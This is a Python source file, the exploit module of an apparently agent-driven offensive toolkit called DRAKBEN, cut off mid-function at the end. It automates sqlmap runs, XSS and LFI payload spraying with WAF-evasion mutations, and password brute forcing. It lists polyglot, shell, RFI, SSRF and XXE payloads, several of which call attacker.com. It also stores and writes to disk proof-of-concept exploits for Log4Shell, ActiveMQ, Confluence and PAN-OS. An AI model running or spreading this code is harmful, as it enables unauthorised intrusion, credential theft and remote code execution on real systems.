# modules/exploit/common.py
# DRAKBEN Exploit Module - STATE-AWARE Advanced
# REQUIRED: Exploit precondition model - will not run without conditions
# Enhanced: Logging, retry mechanism, better error handling

import asyncio
import contextlib
import logging
import subprocess
import time
import urllib.parse
from typing import Any
from urllib.parse import urlparse

import aiohttp

from core.execution.tool_selector import ToolSelector

# Setup logger
logger = logging.getLogger(__name__)

# Payload constants (SonarCloud: avoid duplicate literals)
_PAYLOAD_SQL_OR = "OR 1=1"
_PAYLOAD_XSS_ALERT = "alert(1)"
_INDICATOR_EXTENSIONS = "[extensions]"

# State integration
try:
    from core.agent.state import AgentState, AttackPhase

    STATE_AVAILABLE = True
except ImportError:
    STATE_AVAILABLE = False
    logger.warning("State module not available")

try:
    from modules.waf_evasion import WAFEvasion

    WAF_AVAILABLE = True
except ImportError:
    WAF_AVAILABLE = False


class ExploitError(Exception):
    """Custom exception class for all Drakben exploit-related failures."""



class RetryConfig:
    """Configuration for retry mechanism."""

    def __init__(
        self,
        max_retries: int = 3,
        base_delay: float = 1.0,
        max_delay: float = 30.0,
    ) -> None:
        self.max_retries = max_retries
        self.base_delay = base_delay
        self.max_delay = max_delay


# Constants
STATE_REQUIRED_MSG = "State is required for exploit execution"
BURPSUITE_TOOL = "manual/burpsuite"

_RETRYABLE_EXCEPTIONS = (subprocess.TimeoutExpired, ConnectionError, TimeoutError)


async def _async_retry_loop(
    func: Any,
    config: "RetryConfig",
    args: tuple,
    kwargs: dict,
) -> Any:
    """Execute an async function with retry logic and exponential backoff."""
    last_exception: BaseException | None = None
    for attempt in range(config.max_retries):
        try:
            return await func(*args, **kwargs)
        except _RETRYABLE_EXCEPTIONS as e:
            last_exception = e
            if attempt < config.max_retries - 1:
                delay = min(config.base_delay * (2**attempt), config.max_delay)
                logger.warning(
                    "Retry %s/%s for %s after %ss: %s",
                    attempt + 1, config.max_retries, func.__name__, delay, e,
                )
                await asyncio.sleep(delay)
    logger.error("%s failed after %s retries", func.__name__, config.max_retries)
    raise last_exception  # type: ignore[misc]


def _sync_retry_loop(
    func: Any,
    config: "RetryConfig",
    args: tuple,
    kwargs: dict,
) -> Any:
    """Execute a sync function with retry logic and exponential backoff."""
    last_exception: BaseException | None = None
    for attempt in range(config.max_retries):
        try:
            return func(*args, **kwargs)
        except _RETRYABLE_EXCEPTIONS as e:
            last_exception = e
            if attempt < config.max_retries - 1:
                delay = min(config.base_delay * (2**attempt), config.max_delay)
                logger.warning(
                    "Retry %s/%s for %s after %ss: %s",
                    attempt + 1, config.max_retries, func.__name__, delay, e,
                )
                time.sleep(delay)
    logger.error("%s failed after %s retries", func.__name__, config.max_retries)
    raise last_exception  # type: ignore[misc]


def retry_on_failure(config: RetryConfig | None = None) -> Any:
    """Decorator for retry logic with exponential backoff.

    Args:
        config: RetryConfig instance

    """
    if config is None:
        config = RetryConfig()

    def decorator(func) -> Any:
        import asyncio
        import functools

        if asyncio.iscoroutinefunction(func):
            @functools.wraps(func)
            async def async_wrapper(*args, **kwargs) -> Any:
                return await _async_retry_loop(func, config, args, kwargs)
            return async_wrapper

        @functools.wraps(func)
        def wrapper(*args, **kwargs) -> Any:
            return _sync_retry_loop(func, config, args, kwargs)

        return wrapper

    return decorator


# =============================================================================
# 2026 EXPLOIT GENERATION ENGINES
# =============================================================================


class AIEvasion:
    """Simulates AI-driven payload mutation to bypass modern WAFs (2026).
    Uses semantic equivalence and non-standard encoding.
    """

    @staticmethod
    def mutate_payload(payload: str, strategy: str = "semantic") -> list[str]:
        """AI-driven payload mutation to bypass modern WAFs.

        Args:
            payload: Original exploit payload.
            strategy: Mutation strategy ('semantic', 'unicode', 'encoding').

        Returns:
            List of mutated payload strings.

        """
        mutations = []

        # 1. Unicode Normalization Gaps (WAF sees A, Backend sees A')
        # e.g. "＜" (Fullwidth Less-Than) -> "<"
        if "<" in payload:
            mutations.append(payload.replace("<", "\uff1c").replace(">", "\uff1e"))

        # 2. Semantic SQL Equivalents (AI Style)
        if _PAYLOAD_SQL_OR in payload:
            mutations.append(payload.replace(_PAYLOAD_SQL_OR, "OR 333=333"))
            mutations.append(payload.replace(_PAYLOAD_SQL_OR, "OR 'x'='x'"))
            mutations.append(payload.replace(_PAYLOAD_SQL_OR, "|| true"))  # PostgreSQL/SQLite

        # 3. JavaScript Context Splitting
        if _PAYLOAD_XSS_ALERT in payload:
            mutations.append(payload.replace(_PAYLOAD_XSS_ALERT, "top['al'+'ert'](1)"))
            mutations.append(
                payload.replace(_PAYLOAD_XSS_ALERT, "[].constructor.constructor('alert(1)')()"),
            )

        return mutations


class PolyglotEngine:
    """Chimera Engine: Generates context-agnostic polyglot payloads.
    Executable in SQL, NoSQL, XML, and HTML contexts simultaneously.
    """

    @staticmethod
    def get_chimera_payloads() -> list[str]:
        """Generate high-fidelity polyglot payloads (SQL/NoSQL/XML/HTML).

        Returns:
            List of polyglot payload strings.

        """
        return [
            # 1. The "GIFAR" of Text (JSON + SQL + XSS)
            # Breaks out of JSON string, closes SQL, starts Script
            r'" - 1] OR 1=1 -- \";<svg/onload=alert(1)>//',
            # 2. Universal LF/RCE (Shell + Path Traversal + Pipe)
            # Tries to terminate command, pipe to shell, and traverse path
            r'|| /bin/sh -c "cat /etc/passwd" || ../../../etc/passwd #',
            # 3. SSTI + XSS Hybrid (Template Injection)
            r"{{7*7}}<img src=x onerror=alert(1)>",
            # 4. XML + SQL
            r"<!--'--> OR 1=1 --",
        ]


def check_exploit_preconditions(
    state: "AgentState",
    target: str,
    vuln_type: str,
) -> tuple[bool, str]:
    """Exploit precondition kontrolü - ZORUNLU.

    Returns:
        (can_exploit, reason)

    """
    logger.debug(f"Checking exploit preconditions for {vuln_type} on %s", target)

    if not _is_state_available(state):
        return False, STATE_REQUIRED_MSG

    try:
        _validate_state(state)
        _check_target_precondition(state)
    except ExploitError as e:
        return False, str(e)

    if not _check_phase_precondition(state):
        return False, f"Wrong phase: {state.phase.value}, need EXPLOIT phase"

    if not _check_service_precondition(state, target):
        return False, _get_service_error_message(target)

    if not _check_vulnerability_precondition(state, vuln_type):
        return False, "No matching vulnerability found"

    logger.info("Preconditions satisfied for %s exploit", vuln_type)
    return True, "Preconditions satisfied"


def _is_state_available(state: "AgentState") -> bool:
    """Check if the provided agent state is valid and initialized."""
    if not STATE_AVAILABLE or not state:
        logger.warning("State tracking not available")
        return False
    return True


def _validate_state(state: "AgentState") -> None:
    """Validate internal state invariants; raises ExploitError if invalid."""
    if not state:
        raise ExploitError(STATE_REQUIRED_MSG)
    if not state.validate():
        logger.error("State invariant violation detected")
        msg = "State invariant violation"
        raise ExploitError(msg)


def _check_target_precondition(state: "AgentState") -> None:
    """Verify that a target has been designated in the agent state."""
    if not state.target:
        msg = "No target designated"
        raise ExploitError(msg)


def _check_phase_precondition(state: "AgentState") -> bool:
    """Check phase precondition."""
    valid_phases = [AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD, AttackPhase.POST_EXPLOIT]
    if state.phase not in valid_phases:
        logger.warning("Wrong phase: %s, need EXPLOIT phase", state.phase.value)
        return False
    return True


def _check_service_precondition(state: "AgentState", target: str) -> bool:
    """Check service precondition using robust URL parsing."""
    try:
        # Handle IPs directly
        if target.replace(".", "").isdigit():  # Simple IP check
            return True  # Assume open or will be checked by connect

        parsed = urllib.parse.urlparse(target)
        port = parsed.port

        # If no port in URL, infer from scheme
        if not port:
            if parsed.scheme == "http":
                port = 80
            elif parsed.scheme == "https":
                port = 443
            # If still None (e.g. just a hostname), we can't block casually
            else:
                return True

        if not state.open_services:
            logger.debug("No open services recorded in state, strict check skipped")
            return True  # Don't block if we haven't scanned yet

        return port in state.open_services
    except Exception as e:
        logger.debug("Service precondition check error (allowing pass): %s", e)
        return True


def _get_service_error_message(target: str) -> str:
    """Generate localized error message for missing service on target."""
    try:
        _, port_str = target.rsplit(":", 1)
        port = int(port_str)
        return f"Port {port} is not open on target"
    except ValueError:
        return "Invalid target format"


def _check_vulnerability_precondition(state: "AgentState", vuln_type: str) -> bool:
    """Check vulnerability precondition."""
    if not vuln_type or not state.vulnerabilities:
        return True

    has_vuln = any(
        vuln_type.lower() in v.vuln_id.lower() for v in state.vulnerabilities
    )
    if not has_vuln:
        logger.warning("Vulnerability %s not found in scan results", vuln_type)
        return False
    return True


# -------------------------
# SQL Injection (sqlmap)
# -------------------------
@retry_on_failure(RetryConfig(max_retries=2, base_delay=2.0))
async def run_sqlmap(
    state: "AgentState",
    target: str,
    param: str = "id",
    level: str = "1",
) -> dict[str, Any]:
    """STATE-AWARE SQLmap execution (ToolSelector enforced)."""
    logger.info(f"Starting SQLmap scan: {target}?{param}=1 (level=%s)", level)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    # 1. Validation Phase
    validation_result = _validate_sqlmap_request(state, target)
    if validation_result:
        return validation_result

    # 2. Execution Phase
    return await _execute_and_process_sqlmap(target, param, level)


def _validate_sqlmap_request(state: "AgentState", target: str) -> dict[str, Any] | None:
    """Validate preconditions and tool capability."""
    can_run, reason = check_exploit_preconditions(state, target, "sqli")
    if not can_run:
        logger.warning("SQLmap precondition failed: %s", reason)
        return {
            "type": "SQLi",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }

    selector = ToolSelector()
    valid, vreason = selector.validate_tool_selection("sqlmap_scan", state)
    if not valid:
        logger.error("Tool selection blocked: %s", vreason)
        msg = f"Tool selection blocked: {vreason}"
        raise RuntimeError(msg)

    return None


async def _execute_and_process_sqlmap(
    target: str,
    param: str,
    level: str,
) -> dict[str, Any]:
    """Execute SQLMap asynchronously."""
    cmd_args = ["sqlmap", "-u", f"{target}?{param}=1", "--batch", f"--level={level}"]
    selector = ToolSelector()

    start_time = time.time()
    proc = None
    try:
        # Async execution
        proc = await asyncio.create_subprocess_exec(
            *cmd_args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        # Wait with timeout
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
            stdout = stdout.decode("utf-8", errors="ignore")
            stderr = stderr.decode("utf-8", errors="ignore")
        except TimeoutError as e:
            if proc:
                with contextlib.suppress(ProcessLookupError):
                    proc.kill()
            raise subprocess.TimeoutExpired(cmd_args, 300) from e

        duration = time.time() - start_time

        # Create a mock CompletedProcess for compatibility
        mock_result = subprocess.CompletedProcess(
            args=cmd_args,
            returncode=proc.returncode,
            stdout=stdout,
            stderr=stderr,
        )

        _handle_tool_status(selector, proc.returncode)

        return _format_sqlmap_output(mock_result, duration, target)

    except subprocess.TimeoutExpired:
        logger.exception("SQLmap timeout after 300s on %s", target)
        selector.record_tool_failure("sqlmap_scan")
        return {"type": "SQLi", "error": "SQLmap timeout", "timeout": True}
    except FileNotFoundError:
        logger.exception("SQLmap not installed")
        return {"type": "SQLi", "error": "SQLmap not installed", "missing_tool": True}
    except Exception as e:
        logger.exception("SQLmap failed: %s", e)
        return {"type": "SQLi", "error": str(e)}


def _handle_tool_status(selector: Any, exit_code: int) -> None:
    """Log and handle tool exit status via ToolSelector."""
    if exit_code != 0:
        selector.record_tool_failure("sqlmap_scan")
        if selector.is_tool_blocked("sqlmap_scan"):
            msg = "Tool sqlmap_scan blocked due to repeated failures"
            raise RuntimeError(msg)


def _format_sqlmap_output(
    result: subprocess.CompletedProcess,
    duration: float,
    target: str,
) -> dict[str, Any]:
    """Format success output."""
    vulnerable = (
        "is vulnerable" in result.stdout.lower()
        or "injectable" in result.stdout.lower()
    )

    if vulnerable:
        logger.warning("SQL injection vulnerability found on %s", target)

    return {
        "type": "SQLi",
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.returncode,
        "vulnerable": vulnerable,
        "duration": duration,
    }


# -------------------------
# XSS Testi
# -------------------------

def _prepare_xss_payloads(payloads: list[str]) -> list[str]:
    """Prepare XSS payloads with AI mutation and WAF evasion."""
    ai_engine = AIEvasion()
    polyglot_engine = PolyglotEngine()

    # Add Chimera Polyglots
    payloads.extend(polyglot_engine.get_chimera_payloads())

    final_payloads: list[str] = []
    seen: set[str] = set()

    for p in payloads:
        # WAF Evasion
        _add_waf_evasion_payload(p, final_payloads, seen)
        # AI Mutation
        for m in ai_engine.mutate_payload(p):
            if m not in seen:
                final_payloads.append(m)
                seen.add(m)
        # Original
        if p not in seen:
            final_payloads.append(p)
            seen.add(p)

    return final_payloads


def _add_waf_evasion_payload(payload: str, result_list: list, seen: set) -> None:
    """Add WAF-evaded payload if available."""
    if not WAF_AVAILABLE:
        return
    try:
        wafer = WAFEvasion()
        obf = wafer.obfuscate_xss(payload)
        if obf not in seen:
            result_list.append(obf)
            seen.add(obf)
    except Exception as e:
        logger.debug("WAF evasion failed (skipping): %s", e)


def _is_executable_xss_context(content_type: str) -> bool:
    """Check if content type allows XSS execution."""
    return any(ct in content_type.lower() for ct in ("text/html", "application/xml", "image/svg+xml"))


async def _test_xss_payload(session, target: str, param: str, payload: str) -> dict:
    """Test a single XSS payload."""
    try:
        url = f"{target}?{param}={urllib.parse.quote(payload)}"
        async with session.get(url) as resp:
            text = await resp.text()
            content_type = resp.headers.get("Content-Type", "")
            is_html_context = _is_executable_xss_context(content_type)
            reflected = payload in text
            executable_reflection = reflected and is_html_context

            if executable_reflection:
                logger.warning(f"XSS payload execution probable: {payload[:30]}... (Context: {content_type})")

            return {
                "payload": payload,
                "reflected": reflected,
                "executable_context": executable_reflection,
                "status": resp.status,
            }
    except Exception as e:
        logger.debug("XSS test error with payload %s...: %s", payload[:20], e)
        return {"payload": payload, "error": str(e)}


async def test_xss(
    state: "AgentState",
    target: str,
    param: str = "q",
    payloads: list[str] | None = None,
) -> dict[str, Any]:
    """XSS vulnerability test with multiple payloads.

    Args:
        state: AgentState instance
        target: Target URL
        param: Parameter to test
        payloads: List of XSS payloads to test

    Returns:
        Dict with test results

    """
    logger.info(f"Starting XSS test on {target}, param=%s", param)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "xss")
    if not can_run:
        logger.warning("XSS precondition failed: %s", reason)
        return {"type": "XSS", "error": f"Precondition failed: {reason}", "blocked": True}

    if payloads is None:
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
        ]

    # Prepare payloads with evasion
    payloads = _prepare_xss_payloads(payloads)
    logger.info(f"Hyper-Evasion Active: Testing {len(payloads)} mutated/polyglot payloads")

    results = []
    vulnerable_payloads = []

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for payload in payloads:
                result = await _test_xss_payload(session, target, param, payload)
                results.append(result)
                if result.get("executable_context"):
                    vulnerable_payloads.append(payload)

        vulnerable = len(vulnerable_payloads) > 0
        if vulnerable:
            logger.warning(f"XSS vulnerability confirmed with {len(vulnerable_payloads)} payloads")
        else:
            logger.info("No executable XSS vulnerability found")

        return {
            "type": "XSS",
            "vulnerable": vulnerable,
            "vulnerable_payloads": vulnerable_payloads,
            "results": results,
            "tested_count": len(payloads),
        }

    except Exception as e:
        logger.exception("XSS test failed: %s", e)
        return {"type": "XSS", "error": str(e)}


# Constants for vulnerability indicators
INDICATOR_ROOT = "root:"
INDICATOR_DAEMON = "daemon:"
INDICATOR_EXTENSIONS = _INDICATOR_EXTENSIONS  # Use module-level constant


# -------------------------
# LFI Testi
# -------------------------
async def test_lfi(
    state: "AgentState",
    target: str,
    param: str = "file",
    payloads: list[str] | None = None,
) -> dict[str, Any]:
    """LFI vulnerability test with multiple payloads.

    Args:
        state: AgentState instance
        target: Target URL
        param: Parameter to test
        payloads: List of LFI payloads to test

    Returns:
        Dict with test results

    """
    logger.info(f"Starting LFI test on {target}, param=%s", param)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "lfi")
    if not can_run:
        logger.warning("LFI precondition failed: %s", reason)
        return {
            "type": "LFI",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }

    if payloads is None:
        payloads = _get_default_lfi_payloads()

    linux_indicators = [INDICATOR_ROOT, INDICATOR_DAEMON, "bin:", "sys:", "nobody:"]
    windows_indicators = [INDICATOR_EXTENSIONS, "[fonts]", "localhost"]

    results, vulnerable_payloads = await _test_lfi_payloads(
        target,
        param,
        payloads,
        linux_indicators,
        windows_indicators,
    )

    return _build_lfi_result(results, vulnerable_payloads, len(payloads))


def _get_default_lfi_payloads() -> list[str]:
    """Get default LFI payloads."""
    return [
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....\\....\\....\\windows\\win.ini",
    ]


async def _test_lfi_payloads(
    target: str,
    param: str,
    payloads: list[str],
    linux_indicators: list[str],
    windows_indicators: list[str],
) -> tuple[list[dict], list[str]]:
    """Test all LFI payloads."""
    results = []
    vulnerable_payloads = []

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
        ) as session:
            for payload in payloads:
                result = await _test_single_lfi_payload(
                    session,
                    target,
                    param,
                    payload,
                    linux_indicators,
                    windows_indicators,
                )
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        vulnerable_payloads.append(payload)
    except Exception as e:
        logger.exception("LFI test failed: %s", e)
        return [], []

    return results, vulnerable_payloads


async def _test_single_lfi_payload(
    session: aiohttp.ClientSession,
    target: str,
    param: str,
    payload: str,
    linux_indicators: list[str],
    windows_indicators: list[str],
) -> dict | None:
    """Test a single LFI payload."""
    try:
        url = f"{target}?{param}={payload}"
        async with session.get(url) as resp:
            text = await resp.text()

            # 1. Success Patterns (Direct Content)
            found_linux = any(ind in text for ind in linux_indicators)
            found_windows = any(ind in text for ind in windows_indicators)

            # 2. Error Patterns (Heuristic)
            # Sometimes we don't get /etc/passwd but we get "Warning: include(/etc/passwd): failed to open stream"
            # This indicates LFI is POSSIBLE but file might not exist or permission denied.
            error_patterns = [
                "root:x:0:0:",  # Strong indicator
                "failed to open stream",
                "Start of Image",  # For LFI to RCE via upload
                "No such file",  # Disclosure
                "open_basedir restriction",
                "boot.ini",
                _INDICATOR_EXTENSIONS,
            ]

            heuristic_error = any(
                p in text
                for p in error_patterns
                if p not in [INDICATOR_ROOT, INDICATOR_DAEMON]
            )

            vulnerable = found_linux or found_windows or heuristic_error

            os_type: str | None = None
            if vulnerable:
                if found_linux:
                    os_type = "Linux"
                elif found_windows:
                    os_type = "Windows"
                else:
                    os_type = "Unknown/Heuristic"

                logger.warning(f"LFI vulnerability found ({os_type}): %s", payload)

            return {
                "payload": payload,
                "vulnerable": vulnerable,
                "os_type": os_type,
                "status": resp.status,
                "heuristic_trigger": heuristic_error,
            }
    except Exception as e:
        logger.debug(f"LFI test error with payload {payload}: %s", e)
        return {"payload": payload, "error": str(e)}


def _build_lfi_result(
    results: list[dict],
    vulnerable_payloads: list[str],
    tested_count: int,
) -> dict:
    """Build LFI test result."""
    if vulnerable_payloads:
        logger.warning(
            f"LFI vulnerability confirmed with {len(vulnerable_payloads)} payloads",
        )
    else:
        logger.info("No LFI vulnerability found")

    return {
        "type": "LFI",
        "vulnerable": len(vulnerable_payloads) > 0,
        "vulnerable_payloads": vulnerable_payloads,
        "results": results,
        "tested_count": tested_count,
    }


# -------------------------
# Basit Auth Bypass
# -------------------------
async def brute_force_login(
    state: "AgentState",
    target: str,
    username: str = "admin",
    passwords: list[str] | None = None,
    rate_limit_delay: float = 0.5,
) -> dict[str, Any]:
    """Authentication brute force with rate limiting.

    Args:
        state: AgentState instance
        target: Login endpoint URL
        username: Username to test
        passwords: Password list
        rate_limit_delay: Delay between attempts (seconds)

    Returns:
        Dict with brute force results

    """
    logger.info(f"Starting brute force on {target}, username=%s", username)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "auth_bypass")
    if not can_run:
        logger.warning("Brute force precondition failed: %s", reason)
        return {
            "type": "AuthBypass",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }

    if passwords is None:
        passwords = [
            "admin",
            "123456",
            "password",
            "root",
            "toor",
            "admin123",
            "password123",
            "12345678",
            "qwerty",
            "letmein",
            "welcome",
            "admin@123",
        ]

    # Success indicators
    success_indicators = ["dashboard", "welcome", "logout", "profile", "home"]
    failure_indicators = ["invalid", "incorrect", "failed", "wrong", "error"]

    attempts = []

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
        ) as session:
            for pwd in passwords:
                try:
                    # Rate limiting
                    await asyncio.sleep(rate_limit_delay)

                    data = {"username": username, "password": pwd}
                    async with session.post(
                        target,
                        data=data,
                        allow_redirects=False,
                    ) as resp:
                        text = await resp.text()
                        text_lower = text.lower()

                        # Check for success
                        is_redirect = resp.status in [301, 302, 303, 307, 308]
                        has_success_indicator = any(
                            ind in text_lower for ind in success_indicators
                        )
                        has_failure_indicator = any(
                            ind in text_lower for ind in failure_indicators
                        )

                        success = (
                            is_redirect or has_success_indicator
                        ) and not has_failure_indicator

                        attempts.append(
                            {
                                "password": pwd,
                                "status": resp.status,
                                "success": success,
                            },
                        )

                        if success:
                            logger.warning(f"Successful login found: {username}:%s", pwd)
                            return {
                                "type": "AuthBypass",
                                "success": True,
                                "username": username,
                                "password": pwd,
                                "attempts": len(attempts),
                            }

                except Exception as e:
                    logger.debug(f"Brute force attempt error with password {pwd}: %s", e)
                    attempts.append({"password": pwd, "error": str(e)})

        logger.info(
            f"Brute force completed: no valid credentials found in {len(attempts)} attempts",
        )
        return {
            "type": "AuthBypass",
            "success": False,
            "attempts": len(attempts),
            "tested_passwords": len(passwords),
        }

    except Exception as e:
        logger.exception("Brute force failed: %s", e)
        return {"type": "AuthBypass", "error": str(e)}


# -------------------------
# AI-Powered Recommendation
# -------------------------
async def ai_exploit_advice(state: "AgentState") -> dict[str, Any]:
    """AI-powered exploit recommendation.

    .. deprecated::
        This function is deprecated. Use ``core.agent.brain.Brain.think()`` instead.

    Args:
        state: AgentState instance

    Returns:
        Dict with deprecation notice

    """
    import warnings

    warnings.warn(
        "ai_exploit_advice is deprecated. Use brain.think() instead.",
        DeprecationWarning,
        stacklevel=2,
    )
    logger.warning("ai_exploit_advice is deprecated. Use brain.think() instead.")

    if state is None:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}

    if not STATE_AVAILABLE or not state:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}

    if not state.validate():
        logger.error("State invariant violation in AI advice")
        return {
            "type": "AI",
            "error": "State invariant violation",
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }

    # CORE REFACTOR: ai_bridge removed. Use Brain directly.
    await asyncio.sleep(0)  # Keep function async for compatibility
    return {
        "type": "AI",
        "deprecated": True,
        "message": "Use brain.think() instead of ai_exploit_advice()",
    }


# -------------------------
# Suggest Exploit (Helper)
# -------------------------
def suggest_exploit(
    vulnerability_type: str,
    target: str | None = None,
) -> dict[str, Any]:
    """Suggest appropriate exploit based on vulnerability type.

    Args:
        vulnerability_type: Type of vulnerability (sqli, xss, lfi, auth_bypass)
        target: Optional target URL

    Returns:
        dict with exploit suggestions

    """
    logger.debug("Suggesting exploit for vulnerability type: %s", vulnerability_type)

    suggestions: dict[str, Any] = {
        "sqli": {
            "tool": "sqlmap",
            "command": (
                f"sqlmap -u {target} --batch"
                if target
                else "sqlmap -u <target> --batch"
            ),
            "description": "SQL Injection automated exploitation",
            "severity": "high",
            "payloads": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1; DROP TABLE users--",
            ],
        },
        "xss": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(document.cookie)",
            ],
            "description": "Cross-Site Scripting test payloads",
            "severity": "medium",
        },
        "lfi": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ",
            ],
            "description": "Local File Inclusion test paths",
            "severity": "high",
        },
        "rfi": {
            "tool": "manual",
            "payloads": [
                "http://attacker.com/shell.txt",
                "https://raw.githubusercontent.com/.../shell.php",
            ],
            "description": "Remote File Inclusion test URLs",
            "severity": "critical",
        },
        "auth_bypass": {
            "tool": "hydra",
            "command": (
                f"hydra -L users.txt -P pass.txt {target} http-post-form"
                if target
                else "hydra -L users.txt -P pass.txt <target> http-post-form"
            ),
            "description": "Authentication brute force",
            "severity": "high",
        },
        "ssrf": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
            ],
            "description": "Server-Side Request Forgery test payloads",
            "severity": "high",
        },
        "xxe": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            "description": "XML External Entity test payloads",
            "severity": "high",
        },
    }

    # ... (existing suggestions code) ...
    vuln_lower = vulnerability_type.lower()

    # NEW: Dynamic CVE Exploit Lookup
    # If the vulnerability looks like a CVE (e.g., CVE-2024-1234), try to fetch it.
    if vuln_lower.startswith("cve-"):
        logger.info(
            f"CVE detected: {vuln_lower}. Attempting to fetch known exploits...",
        )
        return {
            "tool": "exploit_fetcher",
            "cve_id": vuln_lower.upper(),
            "description": f"Auto-fetch exploit for {vuln_lower.upper()}",
            "severity": "critical",
            "action": "fetch_and_run",
        }

    if vuln_lower in suggestions:
        logger.info("Found exploit suggestion for %s", vuln_lower)
        return suggestions[vuln_lower]

    logger.warning("Unknown vulnerability type: %s", vulnerability_type)
    return {
        "error": f"Unknown vulnerability type: {vulnerability_type}",
        "available": list(suggestions.keys()),
    }


async def fetch_and_prepare_exploit(state: "AgentState", cve_id: str) -> dict[str, Any]:
    """Dynamically fetch exploit code for a given CVE from public repositories.

    First checks the local CVE database (NVD cache) for information,
    then falls back to known exploit templates, and finally suggests
    AI-assisted search if nothing is found locally.
    """
    logger.info("Searching for exploit: %s", cve_id)

    if state is None:
        return {"success": False, "error": "State required"}

    # ---- Step 1: Query local NVD cache via CVEDatabase ----
    cve_details: dict[str, Any] | None = None
    try:
        from modules.cve_database import CVEDatabase

        db = CVEDatabase(auto_update=False)
        results = await db.search_cves(keyword=cve_id, max_results=1)
        if results:
            entry = results[0]
            cve_details = entry.to_dict()
            logger.info(
                "CVE found in NVD cache: %s (CVSS %.1f)",
                entry.cve_id,
                entry.cvss_score,
            )
    except Exception as e:
        logger.warning("CVEDatabase lookup failed: %s", e)

    # ---- Step 2: Known exploit templates (local PoC bank) ----
    known_cves = {
        "CVE-2021-44228": {
            "name": "Log4Shell",
            "code": "# Log4Shell PoC\nimport requests\ndef exploit(target) -> Any:\n    payload = '${jndi:ldap://attacker.com/a}'\n    requests.get(target, headers={'User-Agent': payload})",
            "lang": "python",
        },
        "CVE-2017-0144": {
            "name": "EternalBlue",
            "code": "# EternalBlue SMB Exploit wrapper\n# ... binary payload ...",
            "lang": "python",
        },
        "CVE-2023-44228": {
            "name": "Apache ActiveMQ RCE",
            "code": "# ActiveMQ ClassPathXmlApplicationContext RCE\nimport requests\ndef exploit(target: str, payload_url: str) -> bool:\n    url = f'{target}/api/message?destination=queue://test'\n    headers = {'Content-Type': 'application/xml'}\n    body = f'<?xml version=\"1.0\"?><beans><bean class=\"org.springframework.context.support.ClassPathXmlApplicationContext\"><constructor-arg value=\"{payload_url}\"/></bean></beans>'\n    r = requests.post(url, headers=headers, data=body, timeout=10)\n    return r.status_code == 200",
            "lang": "python",
        },
        "CVE-2023-22515": {
            "name": "Confluence Auth Bypass",
            "code": "# Confluence Auth Bypass PoC\nimport requests\ndef exploit(target: str) -> dict:\n    url = f'{target}/server-info.action'\n    setup_url = f'{target}/setup/setupadministrator.action'\n    r = requests.get(setup_url, timeout=10)\n    return {'vulnerable': r.status_code == 200, 'url': setup_url}",
            "lang": "python",
        },
        "CVE-2024-3400": {
            "name": "PAN-OS Command Injection",
            "code": "# PAN-OS GlobalProtect Command Injection\nimport requests\ndef check_vuln(target: str) -> bool:\n    url = f'{target}/ssl-vpn/hipreport.esp'\n    r = requests.get(url, params={'type': 'a]`echo vulnerable`'}, timeout=10, verify=False)\n    return 'vulnerable' in r.text",
            "lang": "python",
        },
    }

    if cve_id in known_cves:
        data = known_cves[cve_id]
        exploit_code = data["code"]
        logger.info(f"Exploit found for {cve_id} (%s)", data["name"])

        # Save to temp file
        filename = f"modules/dynamic_exploits/{cve_id}.py"
        import os

        import aiofiles

        os.makedirs(os.path.dirname(filename), exist_ok=True)

        async with aiofiles.open(filename, "w") as f:
            await f.write(exploit_code)

        result: dict[str, Any] = {
            "success": True,
            "exploit_file": filename,
            "language": data["lang"],
            "description": data["name"],
        }
        if cve_details:
            result["nvd_info"] = cve_details
        return result

    # ---- Step 3: CVE found in NVD but no local exploit ----
    if cve_details:
        return {
            "success": False,
            "error": "CVE found in NVD but no local exploit template available.",
            "cve_id": cve_id,
            "nvd_info": cve_details,
            "recommendation": "Use search_web tool to find PoC based on NVD references",
        }

    # ---- Step 4: Nothing found locally ----
    logger.warning(
        "No local exploit found for %s. Enabling AI search mode.", cve_id,
    )
    return {
